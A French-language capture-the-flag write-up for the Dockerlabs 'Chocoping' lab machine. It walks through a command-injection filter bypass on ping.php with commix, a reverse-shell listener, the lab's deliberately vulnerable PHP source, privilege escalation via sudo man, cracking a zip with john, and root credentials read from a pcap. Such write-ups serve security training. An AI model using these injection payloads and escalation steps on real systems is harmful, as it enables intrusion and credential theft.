---
Titre: Chocoping
categories:
  - Dockerlabs
date: 2026-10-15
description: Chocoping est une machine de niveau moyen de la plateforme dockerlabs, créer par El Pingüino de Mario, elle enseigne le contournement de filtre de l'injection de commande ainsi que l'élévation de privilèges via man avec la permission sudo
Createur: El Pingüino de Mario
tags:
  - command-injection
  - commix
  - zip2john
image:
    path: /assets/img/chicoping.png
niveau: moyen
---
## Reconnaissance et numérisation des ports 

```bash
┌──(d4fl0n㉿kali)-[/tmp]
└─$ sudo ./auto_deploy.sh chocoping.tar  
[sudo] password for d4fl0n: 
Sorry, try again.
[sudo] password for d4fl0n: 

	                    ##        .         
	              ## ## ##       ==         
	           ## ## ## ##      ===         
	       /""""""""""""""""\___/ ===       
	  ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
	       \______ o          __/           
	         \    \        __/            
	          \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
				     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

notre machine docker est démarrer et l'IP `172.17.0.2` lui a été attribuer

```bash
┌──(d4fl0n㉿kali)-[/tmp]
└─$ nmap -p 80 172.17.0.2
Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-15 07:48 -0400
Nmap scan report for 172.17.0.2
Host is up (0.0015s latency).

PORT   STATE SERVICE
80/tcp open  http
MAC Address: 2E:A6:69:12:37:F0 (Unknown)
```

```bash
┌──(d4fl0n㉿kali)-[/tmp]
└─$ nmap -p 80 -A -O -sCV 172.17.0.2
Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-15 07:48 -0400
Nmap scan report for 172.17.0.2
Host is up (0.0014s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Index of /
|_http-server-header: Apache/2.4.62 (Debian)
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 1.0K  2025-04-05 11:13  ping.php
|_
MAC Address: 2E:A6:69:12:37:F0 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 1 hop
```

nous avons 1 seul port ouvert et le scan nous informe aussi que le répertoire de la racine web est lister `Index of` et comporte un seul fichier qui est `ping.php`

## Enumération web

```bash
┌──(d4fl0n㉿kali)-[/tmp]
└─$ curl 'http://172.17.0.2/ping.php'
Por favor, ingresa una IP válida. 
```

une fois accéder a l'Endpoint `ping.php`, y'a cette nous qui nous dis de mettre une adresse IP valide  comme c'est la méthode `GET` nous allons tester le paramètre `ping.php?ip=`

```bash
┌──(d4fl0n㉿kali)-[/tmp]
└─$ curl 'http://172.17.0.2/ping.php?ip=127.0.0.1'
<pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.035 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.087 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.051 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.050 ms

--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3065ms
rtt min/avg/max/mdev = 0.035/0.055/0.087/0.019 ms
</pre>
```

c'est le bon paramètre nous allons tester l'injection de commande

```bash
┌──(d4fl0n㉿kali)-[/tmp]
└─$ curl 'http://172.17.0.2/ping.php?ip=127.0.0.1;'
Comando no permitido.

┌──(d4fl0n㉿kali)-[/tmp]
└─$ curl 'http://172.17.0.2/ping.php?ip=127.0.0.1|'
Comando no permitido.

┌──(d4fl0n㉿kali)-[/tmp]
└─$ curl 'http://172.17.0.2/ping.php?ip=127.0.0.1||'
Comando no permitido.

┌──(d4fl0n㉿kali)-[/tmp]
└─$ curl 'http://172.17.0.2/ping.php?ip=127.0.0.1`' 
Comando no permitido.

┌──(d4fl0n㉿kali)-[/tmp]
└─$ curl 'http://172.17.0.2/ping.php?ip=127.0.0.1&'
<pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.036 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.049 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.117 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.052 ms

--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3066ms
rtt min/avg/max/mdev = 0.036/0.063/0.117/0.031 ms
</pre>                                                        
```

certaine caractère sont filtrer nous allons utilise l'outil `commix` pour une automatisation d'exploitation

```bash
┌──(d4fl0n㉿kali)-[/tmp]
└─$ commix -u http://172.17.0.2/ping.php?ip=0.0.0.0 --tamper backslashes   
                                      __
   ___   ___     ___ ___     ___ ___ /\_\   __  _
 /`___\ / __`\ /' __` __`\ /' __` __`\/\ \ /\ \/'\  v4.1
/\ \__//\ \/\ \/\ \/\ \/\ \/\ \/\ \/\ \ \ \\/>  </
\ \____\ \____/\ \_\ \_\ \_\ \_\ \_\ \_\ \_\/\_/\_\ https://commixproject.com
 \/____/\/___/  \/_/\/_/\/_/\/_/\/_/\/_/\/_/\//\/_/ (@commixproject)

+--
Automated All-in-One OS Command Injection Exploitation Tool
Copyright © 2014-2025 Anastasios Stasinopoulos (@ancst)
+--

(!) Legal disclaimer: Usage of commix for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.

[08:41:10] [info] Testing connection to the target URL. 
[08:41:22] [info] Checking whether the target is protected by some kind of WAF/IPS.
[08:41:31] [info] Performing heuristic (passive) tests on the target URL.
[08:41:42] [info] Loaded tamper script: 
           |_ backslashes
[08:41:46] [warning] Target's estimated response time is 3 seconds. That may cause serious delays during the data extraction procedure and/or possible corruptions over the extracted data.
[08:41:46] [info] Setting GET parameter 'ip' for tests.
[08:41:46] [info] Performing heuristic (basic) tests to the GET parameter 'ip'.
[08:41:46] [info] Heuristic (basic) tests show that GET parameter 'ip' might be injectable (possible OS: 'Unix-like').
[08:41:47] [info] Testing the (results-based) classic command injection technique.           
[08:41:47] [info] GET parameter 'ip' appears to be injectable via (results-based) classic command injection technique.
           |_ 0.0.0.0;\ec\h\o \F\W\G\Q\RD$((73+79))$(\ec\h\o \F\W\G\Q\RD)\F\W\G\Q\RD
GET parameter 'ip' is likely vulnerable. Do you want to spawn a pseudo-terminal shell? [Y/n] > 
Pseudo-Terminal Shell (type '?' for available options)
commix(os_shell) > id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
commix(os_shell) > 
```

grâce a la liste des tampers de `commix` nous avons pu exécuter notre commande

## Exploitation - Reverse shell

```bash
┌──(d4fl0n㉿kali)-[/tmp]
└─$ nc -nlvp 4444        
listening on [any] 4444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 44182
bash: cannot set terminal process group (25): Inappropriate ioctl for device
bash: no job control in this shell
www-data@890f1e9c4700:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@890f1e9c4700:/var/www/html$ 
```

***code vulnérable*

```bash
www-data@890f1e9c4700:/var/www/html$ cat ping.php 
<?php

$ip = $_GET['ip'];

function is_bypass_command($input) {
    return preg_match('/[a-zA-Z]+\\\\/', $input);
}

if (isset($ip)) {
    if (!preg_match('/[;&|`]/', $ip)) {
        $ping_result = shell_exec("ping -c 4 " . escapeshellarg($ip));
        echo "<pre>$ping_result</pre>";
    }
    // Si contiene un comando de inyección y es un bypass con barras invertidas
    else if (preg_match('/[;&|`]/', $ip) && is_bypass_command($ip)) {
        // Ejecutamos el ping con la IP proporcionada
        $ping_result = shell_exec("ping -c 4 " . escapeshellarg($ip));
        echo "<pre>$ping_result</pre>";

        // Ejecutamos el comando adicional (esto es vulnerable)
        // Como el comando contiene un bypass (w\h\o\a\m\i), lo permitimos
        $result = shell_exec($ip);
        echo "<pre>$result</pre>";
    } else {
        // Si no contiene un bypass, bloqueamos la ejecución de comandos
        die("Comando no permitido.");
    }
} else {
    echo "Por favor, ingresa una IP válida.";
}

?>
```

la fonction `shell_exec` est responsable de l'injection du commande, le filtre est contourner avec le `/` ou le backslash `\` ainsi que l'ignorassions des caractères interdit

## Escalade de privilèges - énumération, M latérale

**sudo -l**

```bash
www-data@890f1e9c4700:/var/www/html$ sudo -l
Matching Defaults entries for www-data on 890f1e9c4700:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on 890f1e9c4700:
    (balutin) NOPASSWD: /usr/bin/man
www-data@890f1e9c4700:/var/www/html$
```

```bash
www-data@890f1e9c4700:/var/www/html$ getent passwd | grep -i bash
root:x:0:0:root:/root:/bin/bash
balutin:x:1000:1000:balutin,,,:/home/balutin:/bin/bash
www-data@890f1e9c4700:/var/www/html$
```

#### priv to user `balutin`

```bash
www-data@890f1e9c4700:/var/www/html$ sudo -u balutin /usr/bin/man man
MAN(1)                                                                                                        Manual pager utils                                                                                                        MAN(1)

NAME
       man - an interface to the system reference manuals

SYNOPSIS
       man [man options] [[section] page ...] ...
       man -k [apropos options] regexp ...
       man -K [man options] [section] term ...
       man -f [whatis options] page ...
       man -l [man options] file ...
       man -w|-W [man options] page ...

DESCRIPTION
       man  is  the  system's manual pager.  Each page argument given to man is normally the name of a program, utility or function.  The manual page associated with each of these arguments is then found and displayed.  A section, if pro-
       vided, will direct man to look only in that section of the manual.  The default action is to search in all of the available sections following a pre-defined order (see DEFAULTS), and to show only the first page found, even if  page
       exists in several sections.

       The table below shows the section numbers of the manual followed by the types of pages they contain.

       1   Executable programs or shell commands
       2   System calls (functions provided by the kernel)
       3   Library calls (functions within program libraries)
       4   Special files (usually found in /dev)
       5   File formats and conventions, e.g. /etc/passwd
       6   Games
       7   Miscellaneous (including macro packages and conventions), e.g. man(7), groff(7), man-pages(7)
       8   System administration commands (usually only for root)
       9   Kernel routines [Non standard]

       A manual page consists of several sections.

       Conventional section names include NAME, SYNOPSIS, CONFIGURATION, DESCRIPTION, OPTIONS, EXIT STATUS, RETURN VALUE, ERRORS, ENVIRONMENT, FILES, VERSIONS, CONFORMING TO, NOTES, BUGS, EXAMPLE, AUTHORS, and E ALSO.

       The following conventions apply to the SYNOPSIS section and can be used as a guide in other sections.

       bold text          type exactly as shown.
       italic text        replace with appropriate argument.
       [-abc]             any or all arguments within [ ] are optional.
       -a|-b              options delimited by | cannot be used together.
       argument ...       argument is repeatable.
       [expression] ...   entire expression within [ ] is repeatable.

       Exact rendering may vary depending on the output device.  For instance, man will usually not be able to render italics when running in a terminal, and will typically use underlined or coloured text instead.

       The command or function illustration is a pattern that should match all possible invocations.  In some cases it is advisable to illustrate several exclusive invocations as is shown in the SYNOPSIS section of this manual page.

!bash
balutin@890f1e9c4700:/var/www/html$ 
```

```bash
balutin@890f1e9c4700:/var/www/html$ id
uid=1000(balutin) gid=1000(balutin) groups=1000(balutin),100(users)
balutin@890f1e9c4700:/var/www/html$
```

```bash
balutin@890f1e9c4700:/var/www/html$ cd
balutin@890f1e9c4700:~$ ls
secretito.zip
balutin@890f1e9c4700:~$
```

```bash
balutin@890f1e9c4700:~$ unzip secretito.zip 
Archive:  secretito.zip
[secretito.zip] traffic.pcap password: 
```

dans le répertoire personnel de `balutin` nous avons trouver un fichier zip secret qui est protéger par un mot de passe

nous allons récupérer le fichier sur notre machine attaquant, récupérerons le hash et casser le mon de passe du fichier zip

```bash
┌──(d4fl0n㉿kali)-[/tmp]
└─$ zip2john secretito.zip 
ver 2.0 efh 5455 efh 7875 secretito.zip/traffic.pcap PKZIP Encr: TS_chk, cmplen=293, decmplen=375, crc=04A65EE4 ts=5B18 cs=5b18 type=8
secretito.zip/traffic.pcap:$pkzip$1*1*2*0*125*177*4a65ee4*0*46*8*125*5b18*dc3f50df26c37d7c145e06b14ed5bf95490beb653558e6c51f7ce7601875637bc1af586c5a213bf14df33cae2ec05c363b2c36b48d86de390e7028cefb2da4a79f00f53fab14cdc4b00a4002ba2c2f371ea0fa27b8e481387498c910d47b7838f955ca6c3bb4aade9e954b5852c7625396067eb0cedccee953dc0cb8416d74281d04c9a6fe6f34a25f858baf49d2af3cc57793eecea3cee4c25360d19ea99c45864d58a57a3db98eb2e6777497f4fd78a7b8c901dbb035e3fe6afc2bcf87f06b55257146b6541958dc7fdbcb7d5432e1b0fbd7f9eb60c1b577f9b30ebc4a24e3b0781b02218eaffd23928072be6987a8100307f3634be620d9a52ca9b33b9fa7c62350cd01a2cec1f13e7a7e682f82618cfd00082a4e22106d181c7ef0ffe684b8f784e848*$/pkzip$:traffic.pcap:secretito.zip::secretito.zip

┌──(d4fl0n㉿kali)-[/tmp]
└─$ zip2john secretito.zip > hash
ver 2.0 efh 5455 efh 7875 secretito.zip/traffic.pcap PKZIP Encr: TS_chk, cmplen=293, decmplen=375, crc=04A65EE4 ts=5B18 cs=5b18 type=8

┌──(d4fl0n㉿kali)-[/tmp]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash                     
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
chocolate        (secretito.zip/traffic.pcap)     
1g 0:00:00:00 DONE (2026-10-15 10:13) 33.33g/s 273066p/s 273066c/s 273066C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

nous avons casser le mot de passe du fichier zip, le mot de passe est `chocolate`

```bash
┌──(d4fl0n㉿kali)-[/tmp]
└─$ unzip secretito.zip      
Archive:  secretito.zip
[secretito.zip] traffic.pcap password: 
  inflating: traffic.pcap 
```

le zip est une Traffic réseau, regardons le contenu

```bash
┌──(d4fl0n㉿kali)-[/tmp]
└─$ strings traffic.pcap                                                 
POST /login HTTP/1.1
Host: ejemplo.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
username=root&password=secretitosecretazo!
GET /private HTTP/1.1
Authorization: Basic cm9vdDpTdXBlclNlY3JldDEyMyE=
Host: ejemplo.com
```

dans le contenu nous avons le mot de passe de l'utilisateur `root`

```
root:secretitosecretazo!
```

essayons la connexion au compte `root`

```bash
www-data@890f1e9c4700:/var/www/html$ su root
Password: 
root@890f1e9c4700:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root)
root@890f1e9c4700:/var/www/html# 
```



